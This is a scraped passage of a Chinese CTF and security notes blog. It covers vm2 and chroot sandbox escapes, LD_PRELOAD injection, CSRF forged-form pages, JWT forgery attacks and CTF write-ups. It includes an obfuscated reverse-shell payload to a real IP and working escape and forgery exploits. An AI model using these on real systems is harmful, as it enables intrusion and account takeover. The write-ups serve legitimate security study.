&#x27;Promise.resolve().then(()=&gt;&#123;while(1)console.log(&quot;foo&quot;, Date.now());&#125;); while(1)console.log(Date.now())&#x27;, &#123;console:&#123;log()&#123;console.log.apply(console,arguments);&#125;&#125;&#125;, &#123;timeout:5&#125;); CVECVE-2023-30547（vm2≤3.9.16） 绕过关键词12345&#x27;child_pr&#x27;+&#x27;ocess&#x27;&#x27;child_procBess&#x27;.replace(&#x27;B&#x27;,&#x27;&#x27;)&#x27;child_proCess&#x27;.toLowerCase()`$&#123;`child_p$&#123;`ro`&#125;cess`&#125;``$&#123;`$&#123;`exe`&#125;cSync`&#125;` 点 .利用with绕过。 1with(String)with(f=fromCharCode,this)with(constructor)with(constructor(f(r=114,e=101,t=116,117,r,110,32,p=112,r,111,c=99,e,s=115,s))())with(mainModule)with(require(f(c,h=104,105,108,100,95,p,r,111,c,e,s,s)))exec(f(98,97,s,h,32,45,c,32,34,98,97,s,h,32,45,105,32,62,38,32,47,100,e,118,47,t,c,p,47,a=56,b=49,46,54,a,46,b,50,48,46,b,52,47,a,a,a,57,32,48,62,38,b,34)) 引号 使用String的 fromCharCode 通过ASCII码值构造。 反引号 参考SSTI (Server Side Template Injection) NodeJS VM和VM2沙箱逃逸 ​ chrootchroot逃逸的核心是使进程中存在一个文件，处于根目录树之外。 参考：I’M IN CHROOT JAIL, GET ME OUT OF HERE! mount1234mount /dev/sda1 /tmpcd /tmpcd /tmp/bin./cat /tmp/etc/passwd /proc12ls /proc/*/rootcd /proc/[PID]/root 清空env查看env可以发现，有个奇怪的变量：LD_PRELOAD=libfakechroot.so，它是一个用于在用户权限下更改root目录的工具。 只要把这个环境变量给删掉：env LD_PRELOAD=/bash，就在真正的root中了。 可执行程序123cat &lt;&lt; EOF &gt; getmeoutofhere.c[内容]EOF C 123456789101112131415161718192021222324// Shortened version of this:// http://www.bpfh.net/simes/computing/chroot-break.html#include &lt;stdio.h&gt; #include &lt;errno.h&gt; #include &lt;fcntl.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/stat.h&gt; #include &lt;sys/types.h&gt; int main() &#123; int x; /* Used to move up a directory tree */ int dir_fd; /* File descriptor to directory */ mkdir(&quot;chroot-breakout-dir&quot;, 0755); dir_fd=open(&quot;.&quot;, O_RDONLY); chroot(&quot;chroot-breakout-dir&quot;); fchdir(dir_fd); close(dir_fd); for(x = 0; x &lt; 1024; x++) &#123; chdir(&quot;..&quot;); &#125; chroot(&quot;.&quot;); system(&quot;/bin/sh&quot;);&#125; Perl 123456789101112131415161718192021222324252627282930313233#!/usr/bin/perl -wuse strict;# unchroot.pl Dec 2007# http://pentestmonkey.net/blog/chroot-breakout-perl# This script may be used for legal purposes only.# Go to the root of the jailchdir &quot;/&quot;;# Open filehandle to root of jailopendir JAILROOT, &quot;.&quot; or die &quot;ERROR: Couldn&#x27;t get file handle to root of jailn&quot;;# Create a subdir, move into itmkdir &quot;mysubdir&quot;;chdir &quot;mysubdir&quot;;# Lock ourselves in a new jailchroot &quot;.&quot;;# Use our filehandle to get back to the root of the old jailchdir(*JAILROOT);# Get to the real rootwhile ((stat(&quot;.&quot;))[0] != (stat(&quot;..&quot;))[0] or (stat(&quot;.&quot;))[1] != (stat(&quot;..&quot;))[1]) &#123; chdir &quot;..&quot;;&#125;# Lock ourselves in real root - so we&#x27;re not really in a jail at all nowchroot &quot;.&quot;;# Start an un-jailed shellsystem(&quot;/bin/sh&quot;); libc注入echo -e 可以写入二进制程序，利用 echo -e 上传so文件。利用elf文件动态加载环境变量更换libc，实现libc注入。 1234567891011121314151617import osfrom pwn import *#context.log_level=&#x27;debug&#x27;io = remote(&quot;xxx&quot;,xxx)b = open(&quot;./in.so&quot;).read().encode(&quot;hex&quot;)c = &quot;&quot;for i in range(0,len(b),2): c += &#x27;\\\\x&#x27;+b[i]+b[i+1]payload = &#x27;echo -e &quot;&#x27;+c+&#x27;&quot;&#x27;+&#x27;&gt; exp&#x27;print &quot;[+] length: &quot; + hex(len(payload))io.sendline(payload)io.sendline(&quot;LD_PRELOAD=$PWD/exp /bin/sh&quot;)io.interactive() 1234567891011// in.so#include &lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include &lt;sys/stat.h&gt;int getchar()&#123; chmod(&quot;flag&quot;,777); printf(&quot;%s\\n&quot;, &quot;6666666&quot;);&#125;#gcc -shared -fPIC in.c -o in.so#LD_PRELOAD=$PWD/in.so /bin/sh","categories":[{"name":"misc","slug":"misc","permalink":"https://lazzzaro.github.io/categories/misc/"}],"tags":[{"name":"逃逸","slug":"逃逸","permalink":"https://lazzzaro.github.io/tags/%E9%80%83%E9%80%B8/"},{"name":"python","slug":"python","permalink":"https://lazzzaro.github.io/tags/python/"},{"name":"node.js","slug":"node-js","permalink":"https://lazzzaro.github.io/tags/node-js/"}],"author":"Lazzaro"},{"title":"CSRF","slug":"web-CSRF","date":"2020-08-17T13:57:41.000Z","updated":"2020-10-25T15:38:41.201Z","comments":true,"path":"2020/08/17/web-CSRF/","permalink":"https://lazzzaro.github.io/2020/08/17/web-CSRF/","excerpt":"","text":"​ 跨站请求伪造（CSRF）CSRF，全名 Cross Site Request Forgery，跨站请求伪造。很容易将它与 XSS 混淆，对于 CSRF，其两个关键点是跨站点的请求与请求的伪造，由于目标站无 token 或 referer 防御，导致用户的敏感操作的每一个参数都可以被攻击者获知，攻击者即可以伪造一个完全一样的请求以用户的身份达到恶意目的。 按请求类型，可分为 GET 型和 POST 型。 按攻击方式，可分为 HTML CSRF、JSON HiJacking、Flash CSRF 等。 HTML CSRF使用表单来对 POST 型的请求进行伪造： 123456789101112131415161718192021222324252627282930313233343536373839&lt;!--click.html--&gt;&lt;html&gt;&lt;body&gt;&lt;h1&gt; This page forges an HTTP POST request.&lt;/h1&gt;&lt;script type=&quot;text/javascript&quot;&gt; function post(url, fields) &#123; //create a &lt;form&gt; element. var p = document.createElement(&quot;form&quot;); //construct the form p.action = url; p.innerHTML = fields; p.target = &quot;_self&quot;; p.method = &quot;post&quot;; //append the form to the current page. document.body.appendChild(p); //submit the form p.submit(); &#125; function csrf_hack() &#123; var fields; // The following are form entries that need to be filled out // by attackers. The entries are made hidden, so the victim // won&#x27;t be able to see them. fields += &quot;&lt;input type=&#x27;hidden&#x27; name=&#x27;target&#x27; value=&#x27;aaaaaa&#x27;&gt;&quot;; fields += &quot;&lt;input type=&#x27;hidden&#x27; name=&#x27;money&#x27; value=&#x27;10000&#x27;&gt;&quot;; fields += &quot;&lt;input type=&#x27;hidden&#x27; name=&#x27;messages&#x27; value=&#x27;test&#x27;&gt;&quot;; post(&#x27;http://173.82.206.142:8005/transfer.php&#x27;, fields); &#125; // invoke csrf_hack() after the page is loaded. window.onload = function() &#123; csrf_hack(); &#125;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;","categories":[{"name":"web","slug":"web","permalink":"https://lazzzaro.github.io/categories/web/"}],"tags":[{"name":"CSRF","slug":"CSRF","permalink":"https://lazzzaro.github.io/tags/CSRF/"}],"author":"Lazzaro"},{"title":"JWT","slug":"web-JWT","date":"2020-08-11T11:38:44.000Z","updated":"2024-11-03T03:34:36.709Z","comments":true,"path":"2020/08/11/web-JWT/","permalink":"https://lazzzaro.github.io/2020/08/11/web-JWT/","excerpt":"","text":"​ JWT的全称是Json Web Token。它遵循JSON格式，将用户信息加密到token里，服务器不保存任何用户信息，只保存密钥信息，通过使用特定加密算法验证token，通过token验证用户身份。基于token的身份验证可以替代传统的cookie+session身份验证方法。 JWT由三个部分组成：header.payload.signature header部分最常用的两个字段是alg和typ，alg指定了token加密使用的算法（最常用的为HMAC和RSA算法），typ声明类型为JWT。 payload则为用户数据以及一些元数据有关的声明，用以声明权限。 signature的功能是保护token完整性。 生成方法为将header和payload两个部分联结起来，然后通过header部分指定的算法，计算出签名。 抽象成公式就是 signature = HMAC-SHA256(base64urlEncode(header) + &#39;.&#39; + base64urlEncode(payload), secret_key) 值得注意的是，编码header和payload时使用的编码方式为base64urlencode，base64url编码是base64的修改版，为了方便在网络中传输使用了不同的编码表，它不会在末尾填充”=”号，并将标准Base64中的”+”和”/“分别改成了”-“和”-“。 完整token生成在线https://jwt.io/ Pythonpython的Pyjwt使用示例： 12345import jwtencoded_jwt = jwt.encode(&#123;&#x27;user_name&#x27;: &#x27;admin&#x27;&#125;, &#x27;key&#x27;, algorithm=&#x27;HS256&#x27;)print(encoded_jwt)print(jwt.decode(encoded_jwt, &#x27;key&#x27;, algorithms=[&#x27;HS256&#x27;])) ​ 攻击方式空加密算法JWT支持使用空加密算法，可以在header中指定alg为None 这样的话，只要把signature设置为空（即不添加signature字段），提交到服务器，任何token都可以通过服务器的验证。举个例子，使用以下的字段 12345678&#123; &quot;alg&quot; : &quot;None&quot;, &quot;typ&quot; : &quot;jwt&quot;&#125;&#123; &quot;user&quot; : &quot;Admin&quot;&#125; 生成的完整token为ew0KCSJhbGciIDogIk5vbmUiLA0KCSJ0eXAiIDogImp3dCINCn0.ew0KCSJ1c2VyIiA6ICJBZG1pbiINCn0 (header+’.’+payload，去掉了’.’+signature字段) 空加密算法的设计初衷是用于调试的，但是如果某天开发人员脑阔瓦特了，在生产环境中开启了空加密算法，缺少签名算法，jwt保证信息不被篡改的功能就失效了。攻击者只需要把alg字段设置为None，就可以在payload中构造身份信息，伪造用户身份。 ​ 修改RSA加密算法为HMACJWT中最常用的两种算法为HMAC和RSA。 HMAC是密钥相关的哈希运算消息认证码（Hash-based Message Authentication Code）的缩写，它是一种对称加密算法，使用相同的密钥对传输信息进行加解密。 RSA则是一种非对称加密算法，使用私钥加密明文，公钥解密密文。 在HMAC和RSA算法中，都是使用私钥对signature字段进行签名，只有拿到了加密时使用的私钥，才有可能伪造token。 现在我们假设有这样一种情况，一个Web应用，在JWT传输过程中使用RSA算法，密钥pem对JWT token进行签名，公钥pub对签名进行验证。 1234&#123; &quot;alg&quot; : &quot;RS256&quot;, &quot;typ&quot; : &quot;jwt&quot;&#125; 通常情况下密钥pem是无法获取到的，但是公钥pub却可以很容易通过某些途径读取到，这时，将JWT的加密算法修改为HMAC，即 1234&#123; &quot;alg&quot; : &quot;HS256&quot;, &quot;typ&quot; : &quot;jwt&quot;&#125; 同时使用获取到的公钥pub作为算法的密钥，对token进行签名，发送到服务器端。 服务器端会将RSA的公钥（pub）视为当前算法（HMAC）的密钥，使用HS256算法对接收到的签名进行验证。 12345678#node.jsconst jwt = require(&#x27;jsonwebtoken&#x27;);const fs = require(&#x27;fs&#x27;);var cert = fs.readFileSync(process.cwd()+&#x27;xxx.pem&#x27;); var token = jwt.sign(&#123;username: &#x27;aaa&#x27;&#125;, cert, &#123; algorithm: &#x27;HS256&#x27; &#125;);console.log(token) ​ RSA算法双token生成公钥先生成两个token，然后利用rsa_sign2n工具来生成公钥： 1python3 jwt_forgery.py [JWT1] [JWT2] 通过测试得到正确公钥文件，可进一步利用RsaCtfTool得到私钥（或修改RSA加密算法为HMAC）： 1python3 RsaCtfTool.py --public [PEM] --private 参考： DownUnderCTF 2021 - JWT ​ 爆破密钥对 JWT 的密钥爆破需要在一定的前提下进行： 知悉JWT使用的加密算法 一段有效的、已签名的token 签名用的密钥不复杂（弱密钥） 所以其实JWT 密钥爆破的局限性很大。 相关工具： gojwtcrack ./gojwtcrack -t token.txt -d rockyou.txt c-jwt-cracker ./jwtcrack [JWT] jwt_tool python3 jwt_tool.py [JWT] CrackJWTKey python3 CrackJWT.py jwt_str keys.txt ​ 其他pyjwt包-jwt伪造 (CVE-2022-39227)影响版本：pyjwt&lt;3.3.4 代码： 12345678910111213141516171819202122232425262728import base64import stringimport randomfrom flask import *import jwcrypto.jwk as jwkimport picklefrom python_jwt import *app = Flask(__name__)def generate_random_string(length=16): characters = string.ascii_letters + string.digits # 包含字母和数字 random_string = &#x27;&#x27;.join(random.choice(characters) for _ in range(length)) return random_stringapp.config[&#x27;SECRET_KEY&#x27;] = generate_random_string(16)key = jwk.JWK.generate(kty=&#x27;RSA&#x27;, size=2048)@app.route(&quot;/&quot;)def index(): payload=request.args.get(&quot;token&quot;) if payload: token=verify_jwt(payload, key, [&#x27;PS256&#x27;]) session[&quot;role&quot;]=token[1][&#x27;role&#x27;] return render_template(&#x27;index.html&#x27;) else: session[&quot;role&quot;]=&quot;guest&quot; user=&#123;&quot;username&quot;:&quot;xxx&quot;,&quot;role&quot;:&quot;guest&quot;&#125; jwt = generate_jwt(user, key, &#x27;PS256&#x27;, timedelta(minutes=60)) return render_template(&#x27;index.html&#x27;,token=jwt) EXP: 1234567891011121314# 官方：https://github.com/davedoesdev/python-jwt/blob/88ad9e67c53aa5f7c43ec4aa52ed34b7930068c9/test/vulnerability_vows.pyfrom json import loads, dumpsimport python_jwt as jwtfrom jwcrypto.common import base64url_decode, base64url_encodejwt = &quot;xxx&quot; # JWT String[header, payload, signature] = topic.split(&#x27;.&#x27;)parsed_payload = loads(base64url_decode(payload))parsed_payload[&#x27;is_admin&#x27;] = 1parsed_payload[&#x27;username&#x27;] = &#x27;admin&#x27;parsed_payload[&#x27;exp&#x27;] = 2000000000fake_payload = base64url_encode((dumps(parsed_payload, separators=(&#x27;,&#x27;, &#x27;:&#x27;))))print(&#x27;&#123;&quot; &#x27; + header + &#x27;.&#x27; + fake_payload + &#x27;.&quot;:&quot;&quot;,&quot;protected&quot;:&quot;&#x27; + header + &#x27;&quot;, &quot;payload&quot;:&quot;&#x27; + payload + &#x27;&quot;,&quot;signature&quot;:&quot;&#x27; + signature + &#x27;&quot;&#125;&#x27;) 参考： CVE-2022-39227漏洞分析 2022祥云杯 - FunWEB NewstarCTF 2023 - Ye’s Pickle","categories":[{"name":"web","slug":"web","permalink":"https://lazzzaro.github.io/categories/web/"}],"tags":[{"name":"JWT","slug":"JWT","permalink":"https://lazzzaro.github.io/tags/JWT/"}],"author":"Lazzaro"},{"title":"CBCTF 第三届赛博杯","slug":"match-CBCTF-第三届赛博杯","date":"2020-07-28T12:31:07.000Z","updated":"2020-07-28T14:04:37.567Z","comments":true,"path":"2020/07/28/match-CBCTF-第三届赛博杯/","permalink":"https://lazzzaro.github.io/2020/07/28/match-CBCTF-%E7%AC%AC%E4%B8%89%E5%B1%8A%E8%B5%9B%E5%8D%9A%E6%9D%AF/","excerpt":"","text":"​ 从群友@Neve3no处得知并打打酱油的小赛~~ ​ Miscsign_in 66 6c 61 67 7b 39 35 63 35 62 66 33 32 32 39 32 64 37 35 66 35 37 61 35 30 36 37 36 66 36 61 62 35 64 64 38 33 7d 直接hex转string得flag。 ​ α层 这波啊，这波在阿尔法层 用stegsolve工具将两张图片xor操作，圈中正确flag。 ​ guess 有些事，看得很清，却说不清；有些人，了解很深，却猜不透；有些理，很想不通，却行的通。 地址：47.52.113.129 12345 猜数字，误差值小到0.001的值算成功。先输入给的值，然后到轮自己给数，输入范围0.00-10000.00内任何一个数，脚本二分法猜测最坏情况都能在 $\\log_2{10000*100} \\approx 19.9$ 次猜出。 考虑特殊数值NaN，用来表示一个本来要返回数值的操作数未返回数值的情况。任何涉及NaN的操作都会返回NaN，其次，它与任何值都不等，包括自身。 输入nan，脚本猜测次数超过20，拿到flag。 ​ Web尖尖的商店 尖尖开了一个商店,快看能不能买到flag吧 http://checkin.race2020.0rays.club/ 一个购买页面，余额1000不足以购买99999价值的flag。抓包发现余额值存储于cookie里的money中，直接修改提交请求，拿到flag。 ​ Hacked_By_V V今天看到了一个弱口令的站，反手就把他日了。听说后台密码是admin/123456 http://47.52.113.129:10002/ 链接：https://pan.baidu.com/s/1FL7scmbbEvIP3wskLVGVOw 提取码：1234 易居CMS（EjuCMS），下载源码，版本2.x，给了后台账密。首先搜索现成漏洞，存在后台模板代码执行漏洞。 找到后台/login.php?s=Admin/login进入，功能模块-模板管理-default管理，随便找一个文件，如 pc下的list_search.htm，显然能知道此为搜索结果页模板，执行代码部分都位于花括号&#123;&#125;中，尝试插入&#123;php&#125;phpinfo();&#123;/php&#125;保存，前端发现能成功执行。（可在目录下根据时间查看他人修改痕迹2333~） 一开始将代码修改为&#123;php&#125;echo system(&#39;ls&#39;);&#123;/php&#125;发现执行不成功，回到phpinfo结果页查看disable_functions，看到passthru/exec/system/putenv/shell_exec全不能使用。 换读取函数上，修改代码为&#123;php&#125;print_r(scand_dir(&#39;.&#39;));&#123;/php&#125;读到目录下flag文件flag_BzH652，再用&#123;php&#125;print_r(file_get_contents(&#39;flag_BzH652&#39;));&#123;/php&#125;读出flag。 ​ Cryptocheck_in 关于这道题，我听过一个及其诡异疯狂的谣言，在那漫长到无法计算的岁月之前，这道题就已经存在了。 123456789101112131415161718192021222324252627282930313233from gmpy2 import *from sympy import isprime,nextprimefrom Crypto.Util.number import getPrime as getprime ,long_to_bytes,bytes_to_long,inversefrom vanish import flagimport randomdef Getprime(g): while True: p=g*random.randint(1,g)+1 if isprime(p): return pm=bytes_to_long(flag)g=getprime(512)p=Getprime(g)q=Getprime(g)e=65537def lcm(a,b): return (a*b)/gcd(a,b)print &#x27;lcm(p-1,q-1): %d&#x27;%(lcm(p-1,q-1))print &#x27;n: %d&#x27;%(p*q)print &#x27;c: %d&#x27;%(pow(m,e,p*q))&#x27;&#x27;&#x27;lcm(p-1,q-1): 29222879530390785742605477742453420902991175027283185502224574005903986263169096240656898659768251131170153243355896585116206546809026765977240398343841844413932022486239027317290376878970267549705130293352356070399197681533774641809920245792277386418338948725614463605422608450981946445029718369662946357705499281823362508397007696635982211082237545037851621498721235291885337720080893169582699780294708804334786758878624750037193583886404728146815380945201540n: 2228582814888322539771891137733971181257097900700884269780928959802985615275288341111620316685788511492461651695428697100554113037555468881895905318207963274537589532345166133820089694201148988443496514751074857966136041157336680322417272183777409351597268908625677512781049274972325769500959755298004643407023188886359792411648183582888979219785653927285023667015990929441992061367448365123092899330885934801013411132173550954938961520075931155848843991824723727187297663420031211934554344568933171179175237722716971390081142435747796272698118097337803559316319210494963021258386613285360239662354953552369582646607c: 2201106853018581355094419701171997731036843750081916703504266002782698731288317690546242336345890702261049147276084047271293227314969153138029180802403349980519050857699472720333400348342466190619778247784674359271736569275019018808569614566880813745619585529292155639979431043005511905548345767685472340763230813956617014122768477272236518467064016133244646900977041959848793579834848773548018337874928875046550721154575652528641850315494384644468806058021812603748441246192757443085386516155814337307681275922473564325028703523754319072117202083218199961250157611091952832038366393322275194833927035639232266868638&#x27;&#x27;&#x27; 由于 $lcm(p-1,q-1) =k(p-1)(q-1)&lt;&lt; n=pq$，求 $d$ 时用的模如为常规的 $\\varphi(n)=(p-1)(q-1)$ 则 $k$ 的爆破空间将很大，所以用的模应是 $\\lambda(n)=lcm(p-1,q-1)$。再按常规解 $m$ 。 12345678910lcm=29222879530390785742605477742453420902991175027283185502224574005903986263169096240656898659768251131170153243355896585116206546809026765977240398343841844413932022486239027317290376878970267549705130293352356070399197681533774641809920245792277386418338948725614463605422608450981946445029718369662946357705499281823362508397007696635982211082237545037851621498721235291885337720080893169582699780294708804334786758878624750037193583886404728146815380945201540n=2228582814888322539771891137733971181257097900700884269780928959802985615275288341111620316685788511492461651695428697100554113037555468881895905318207963274537589532345166133820089694201148988443496514751074857966136041157336680322417272183777409351597268908625677512781049274972325769500959755298004643407023188886359792411648183582888979219785653927285023667015990929441992061367448365123092899330885934801013411132173550954938961520075931155848843991824723727187297663420031211934554344568933171179175237722716971390081142435747796272698118097337803559316319210494963021258386613285360239662354953552369582646607c=2201106853018581355094419701171997731036843750081916703504266002782698731288317690546242336345890702261049147276084047271293227314969153138029180802403349980519050857699472720333400348342466190619778247784674359271736569275019018808569614566880813745619585529292155639979431043005511905548345767685472340763230813956617014122768477272236518467064016133244646900977041959848793579834848773548018337874928875046550721154575652528641850315494384644468806058021812603748441246192757443085386516155814337307681275922473564325028703523754319072117202083218199961250157611091952832038366393322275194833927035639232266868638e = 65537import gmpy2d=gmpy2.invert(e,lcm)m=pow(c,d,n)print(bytes.fromhex(hex(m)[2:])) ​ warm_up 代码粗糙的质感刺痛了我的眼睛，我似乎能通过这文件锋利的边缘窥探到“它”的本质，但是我不能这样做，我害怕我会看到这道题背后卑劣歹毒如同幽灵一般的隐喻。 Hint: 是一个由RSA衍生出来的密码系统，还挺年轻的。 12345678910111213141516171819202122232425from Crypto.Util.number import getPrime as getprime ,long_to_bytes,bytes_to_long,inversefrom vanish import flagfrom sympy import isprime,nextprimeimport randomm=bytes_to_long(flag)p=getprime(512)q=nextprime(512)n=p*qr=random.randint(1,n)g=random.randint(1,n)c=(pow(g,m,n*n)*pow(r,n,n*n))%(n*n)print &quot;c=%d&quot;%(c)print &quot;n=%d&quot;%(n)print &quot;g=%d&quot;%(g)&#x27;&#x27;&#x27;c=14643617840485727260687883789514337554960495078025159182484344940901600090810578182116617501128323641882943106663241094886209190199404002314247096613925999812837877843566116787148411743428714726661042213165729562285577768043368385746666607442372252641495230532588344276427261824205414379772728577442269620217619275n=5650215343715484415924649393302012617620686312875699289646188186788806118580423414401283971780836312947326343790326120926819026727018136169739576760024802083g=786539430846729749998127835613552594423101498023741082894370020014675937062722533682541592019332908209917194089077366019472368764411032602494945304850258108&#x27;&#x27;&#x27; 1999年提出的Paillier同态加密，这里为一般情况，参考算法代入计算即可。 123456789101112131415161718c=14643617840485727260687883789514337554960495078025159182484344940901600090810578182116617501128323641882943106663241094886209190199404002314247096613925999812837877843566116787148411743428714726661042213165729562285577768043368385746666607442372252641495230532588344276427261824205414379772728577442269620217619275n=5650215343715484415924649393302012617620686312875699289646188186788806118580423414401283971780836312947326343790326120926819026727018136169739576760024802083g=786539430846729749998127835613552594423101498023741082894370020014675937062722533682541592019332908209917194089077366019472368764411032602494945304850258108import gmpy2def L(x): return (x-1)//n#分解np=521q=10844943078148722487379365438199640340922622481527253914867923583087919613398125555472713957352852807960319277908495433640727498516349589577235272092178123lcm=gmpy2.lcm(p-1,q-1)u=gmpy2.invert(L(pow(g,lcm,n*n)),n)m=L(pow(c,lcm,n*n))*u%nprint(bytes.fromhex(hex(m)[2:])) ​ ezrsa 或许是出于理性亦或是恐惧，总之我把这道题藏了起来。我暗中感觉到它有着诱人发狂的能力，我不能让更多人见到它，这道题是黑暗中不可名状的恶兽。 12345678910111213141516171819202122232425262728from Crypto.Util.number import *from secret import e3,hint,flage1=2p1=1407082287125181464014767936705655200254016298201118080211963q1=4483497795612950594917254979514794222210515250120330465584919hint=int(hint.encode(&#x27;hex&#x27;),16)c1=pow(hint,e1,p1*q1)e2=5q2=898033p2=1027487assert e3&lt;=300c2=pow(e3,e2,p2*q2)q3=16471885912035642894544190467774867069446937372970845578732298073p3=21122913513992623721920275602985463699928507831138027#flag=&#x27;flag&#123;*************&#125;&#x27;flag=int(flag.encode(&#x27;hex&#x27;),16) c3=pow(flag,e3,p3*q3)print c1 #1094524901124574666920734011106836493645715846893412590792284228545024220996290692759698315651894211650519689592667719756print c2 #779811265199print c3 #346925245648012783854132941104554194717281878370806475831055718275298366664505658836564073456294047402009856656647760 RSA小套娃题。 先从 $e1,p1,q1,c1$ 解hint，$e=2$ 的情形为Rabin加密 123456789101112131415161718192021222324252627import gmpy2def rabin_decrypt(c, p, q, e=2): n = p * q mp = pow(c, (p + 1) // 4, p) mq = pow(c, (q + 1) // 4, q) yp = gmpy2.invert(p, q) yq = gmpy2.invert(q, p) r = (yp * p * mq + yq * q * mp) % n rr = n - r s = (yp * p * mq - yq * q * mp) % n ss = n - s return (r, rr, s, ss) e1=2p1=1407082287125181464014767936705655200254016298201118080211963q1=4483497795612950594917254979514794222210515250120330465584919c1=1094524901124574666920734011106836493645715846893412590792284228545024220996290692759698315651894211650519689592667719756m=rabin_decrypt(c1,p1,q1,e1)for k in m: try: print(bytes.fromhex(hex(k)[2:])) except: pass #hint: https://eprint.iacr.org/2013/117.pdf 四解中有一解为真正的hint，得到一个paper网址：https://eprint.iacr.org/2013/117.pdf 再从 $e2,p2,q2,c2$ 解 $e3$，常规RSA 12345678910111213p2=1027487q2=898033e2=5c2=779811265199import gmpy2fn2=(p2-1)*(q2-1)d2=gmpy2.invert(e2,fn2)e3=pow(c2,d2,p2*q2)print(e3)#e3=239 最后从 $e3,p3,q3,c3$ 解 $m$，难点在于存在情形 $e \\mid p-1,e \\mid q-1$，参考hint论文，在有限域下求 $e$ 次根 123456789101112131415161718192021###Sagec = 346925245648012783854132941104554194717281878370806475831055718275298366664505658836564073456294047402009856656647760p = 21122913513992623721920275602985463699928507831138027q = 16471885912035642894544190467774867069446937372970845578732298073e = 239P.&lt;a&gt;=PolynomialRing(Zmod(p),implementation=&#x27;NTL&#x27;)f=a^e-cmps=f.monic().roots()P.&lt;a&gt;=PolynomialRing(Zmod(q),implementation=&#x27;NTL&#x27;)g=a^e-cmqs=g.monic().roots()for mpp in mps: x=mpp[0] for mqq in mqs: y=mqq[0] solution = hex(CRT_list([int(x), int(y)], [p, q]))[2:] if solution.startswith(&#x27;666c&#x27;): print(solution) ​ REVERSE⎛⎝WDNMD⎠⎞ 我起了，一枪秒了，有什么好说的（白给签到题） F5未发现有用信息，回到汇编代码，发现main()函数里有flag后半段： 回到全局反汇编窗口，Alt+T全局搜索”flag{“，发现data段藏着flag前半段： ​ 98年的，我玩不过她 如果不是真的喜欢，谁又愿意做舔狗呢 从字符串窗口定位入口在sub_140011950函数： 获取长度为10的字符串存入Buffer数组，令v5[0:10]=Buffer[5:15]，经sub_14001128A函数处理后得到Str1，将其与 I_love_y&amp;u 比较，相等则正确。 跟进sub_14001128A函数，发现switch-case遍历结构： 分别把switch-case结构中case各字符对应的结果字符求出，逐个比对 I_love_y&amp;u 每个字符，还原得原始Buffer[5:15]值，添加前四个字符“flag{”可得flag。 ​ four steps 做re好像挺简单的，不就是解决了这四个步骤不就好了。 从字符串窗口定位入口在sub_1400159A0函数： 读字符串存入Buffer，第一步sub_1400113AC函数处理，比对Buffer[0:4]；第二步sub_1400113B1函数处理Buffer[4:8]；第二步返回值为0则进入第三步，sub_1400113B6函数处理Buffer[8:12]；第四步sub_1400113C5函数处理Buffer[12:16]。 第一步 先初始化256大小的数组a，再做奇数下标的值前后交换，爆破Buffer[0:4]： 1234567891011121314a=[j for j in range(256)]for j in range(128): if j%2==1: a[j],a[256-j]=a[256-j],a[j]c=[96,106,153,159]m=&#x27;&#x27;for cc in c: for k in range(128): if a[k]^6==cc: m+=chr(k) breakprint(m)#flag 第二步 根据等式爆破，选择合适结果： 1234567891011m=&#x27;&#x27;for x4 in range(128): for x5 in range(128): for x6 in range(128): for x7 in range(128): if (x5&gt;&gt;4)+(x4&gt;&gt;4)==13 and (x7&gt;&gt;4)+(x6&gt;&gt;4)==13 and (x4&amp;0xF)-(x5&amp;0xF)==10 and (x6&amp;0xF)-(x7&amp;0xF)==11 and (x6&amp;0xF)-(x5&amp;0xF)==13 and (x5&gt;&gt;4)==(x6&gt;&gt;4): m=chr(x4)+chr(x5)+chr(x6)+chr(x7) print(m)#6个结果，选择正确的#&#123;ans 第三步 变了码表的base64编码，码表为AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz1234567890+/，编码结果o3kZl3==，使用工具解码得wer_。 第四步 同第一步，爆破Buffer[12:16]： 123456789c=[214,86,18,215]m=&#x27;&#x27;for cc in c: for k in range(128): if 16*(k&amp;0xF)+(k&gt;&gt;4)==cc: m+=chr(k) breakprint(m)#me!&#125; 拼接四步得到的字符串得flag。","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2020赛","slug":"2020赛","permalink":"https://lazzzaro.github.io/tags/2020%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"DASCTF 2020 安恒七月赛","slug":"match-DASCTF-2020-安恒七月赛","date":"2020-07-25T07:48:51.000Z","updated":"2020-07-25T09:17:10.216Z","comments":true,"path":"2020/07/25/match-DASCTF-2020-安恒七月赛/","permalink":"https://lazzzaro.github.io/2020/07/25/match-DASCTF-2020-%E5%AE%89%E6%81%92%E4%B8%83%E6%9C%88%E8%B5%9B/","excerpt":"","text":"​ MISCwelcome to the misc world解压得一张图red_blue.png和加密压缩包flag.rar，那么密码肯定在图里了。 由关键字red/blue想到lsb隐写，用Stegsolve工具查找无结果，放到zsteg命令下看，发现png图，提取出来： 得到压缩包密码 /*///1258/*/@#。 用360压缩打开直接能看到NTFS隐写文件： (23333~~) 打开flag.txt，得到一串字符，由包含的字符猜测为base85编码，尝试解码得到flag。 ​ CRYPTObullshit 给定脚本 123456789101112131415161718from flag import flagdef pairing(a,b): shell = max(a, b) step = min(a, b) if step == b: flag = 0 else: flag = 1 return shell ** 2 + step * 2 + flagdef encrypt(message): res = &#x27;&#x27; for i in range(0,len(message),2): res += str(pairing(message[i],message[i+1])) return resprint(encrypt(flag))# 1186910804152291019933541010532411051999082499105051010395199519323297119520312715722 加密脚本思路： 将明文message每两个字符分别作为pairing()函数的参数，返回的int结果值连接，得到输出密文。 因flag可能包含的ASCII字符的十进制值 $48 \\leq d \\leq 126$，由pairing()函数返回值知，得到的int结果值范围为 $48^2+48\\cdot2+0 \\leq v \\leq 126^2+126\\cdot2+1 \\Rightarrow 2400 \\leq v \\leq 16129$ 按范围分割密文，再分别爆破每个的输入参数： 1234567891011121314151617181920import stringdic=string.printable[:-6]def pairing(a,b): shell = max(a, b) step = min(a, b) if step == b: flag = 0 else: flag = 1 return shell ** 2 + step * 2 + flagc=[11869,10804,15229,10199,3354,10105,3241,10519,9908,2499,10505,10103,9519,9519,3232,9711,9520,3127,15722]flag=&#x27;&#x27;for k in c: for x in dic: for y in dic: if pairing(ord(x),ord(y))==k: flag+=x+yprint(flag) ​ ezrsa 给定脚本 1234567891011121314151617181920212223242526272829303132from secret import flagfrom Crypto.Util.number import 